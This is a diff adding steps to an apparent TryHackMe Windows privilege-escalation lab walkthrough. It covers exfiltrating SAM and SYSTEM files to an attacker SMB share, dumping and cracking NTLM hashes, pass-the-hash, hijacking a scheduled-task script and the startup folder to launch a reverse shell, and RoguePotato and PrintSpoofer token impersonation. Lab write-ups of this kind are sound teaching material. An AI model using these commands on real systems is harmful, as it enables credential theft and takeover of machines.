@@ -263,42 +263,160 @@ the SAM and SYSTEM files can be used to extract user password hashes
 
 transfer the SAM and SYSTEM files to our machine
 
-![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c715c4f7-7f5c-46cb-9b45-dc036341e29b)
+on our machine
 
 ```
-smbclient //10.10.80.166/Repair
-ls
-get SAM
-get SYSTEM
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
 ```
 
+on windows VM
 
+```
+copy C:\Windows\Repair\SAM \\10.18.37.45\share\
+copy C:\Windows\Repair\SYSTEM \\10.18.37.45\share\
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2c979ef2-50af-4fe2-936f-0c00e06c599b)
 
+now, dump the hash
 
+```
+git clone https://github.com/Tib3rius/creddump7
+pip3 install pycrypto
+python3 creddump7/pwdump.py SYSTEM SAM
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/880ca9e9-4c34-4b79-b153-88d093c5d37b)
 
+crack the admin NTLM hash using hashcat
 
+```
+hashcat -m 1000 --force hash.txt /usr/share/wordlists/rockyou.txt
+```
 
+we got 2 passwords are `admin:password123` and `Administrator:Passw0rd!`
 
+## Passwords - Passing the Hash
 
+you can authenticate using the hash
 
+use the full admin hash with pth-winexe without needing to crack password
 
+```
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.13.218 cmd.exe
+```
 
+## Scheduled Tasks
 
+view the contents of CleanUp.ps1 script
 
+```
+type C:\DevTools\CleanUp.ps1
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f42e85b5-0274-45b1-8fc6-340fc80f8265)
 
+using accesschk.exe again
 
+```
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+```
 
+note that we have the ability to write this file
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e32b4957-f504-4fab-9e83-1474fc8a2c31)
 
+```
+echo C:\Users\user\Desktop\reverse.exe >> C:\DevTools\CleanUp.ps1
+```
 
+now, start another listener and wait for Scheduled Task
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/25219459-b6df-48a6-bafc-d86a435465de)
 
+## Insecure GUI Apps
 
+login as `user` account, open "AdminPaint" on Desktop
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/79c73785-8002-42d5-b39e-88a16a7d666e)
 
+```
+tasklist /V | findstr mspaint.exe
+```
 
+note that Paint is running with admin privilege
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fb9a4adf-2758-4131-ad44-d97d4de2a763)
 
+In Paint, click "File" and then "Open", navigation to C:\Windows\System32\cmd.exe
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5bf4f904-b46b-4a13-9626-7fc036d3e0bb)
+
+## Startup Apps
+
+using accesschk.exe to check StartUp directory
+
+```
+C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+```
+
+note that the BUILTIN\Users group can write files
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3cf0db6a-883c-4299-9e2a-9d49060d84a7)
+
+using cscript which should create a new shortcut to your reverse.exe executable in the StartUp directory
+
+```
+cscript C:\PrivEsc\CreateShortcut.vbs
+```
+
+now, start another listener
+
+restart the windows machine and login again to trigger reverse shell
+
+## Token Impersonation - Rogue Potato
+
+set up a socat redirector, forwarding attacker port 135 to port 9999 on Windows
+
+```
+sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.13.218:9999
+```
+
+start another listener
+
+simulate getting a service account shell by logging into RDP as the admin user, starting an command prompt as administrator
+
+using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account
+
+```
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\Users\user\Desktop\reverse.exe
+```
+
+start another listener
+
+now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell with SYSTEM privileges
+
+```
+C:\PrivEsc\RoguePotato.exe -r 10.18.37.45 -e "C:\Users\user\Desktop\reverse.exe" -l 9999
+```
+
+two user privileges that allows this exploit to work
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c14f56c2-5e55-4934-9ca0-cf4b04181ac8)
+
+## Token Impersonation - PrintSpoofer
+
+do the same 2 steps before, but now we use PrintSpoofer exploit instead of RoguePotato
+
+```
+C:\PrivEsc\PrintSpoofer.exe -c "C:\Users\user\Desktop\reverse.exe" -i
+```
+
+## Privilege Escalation Scripts
+
+several tools have been written which help find potential privilege escalations on Windows
+
++ winPEASany.exe
++ Seatbelt.exe
++ PowerUp.ps1
++ SharpUp.exe
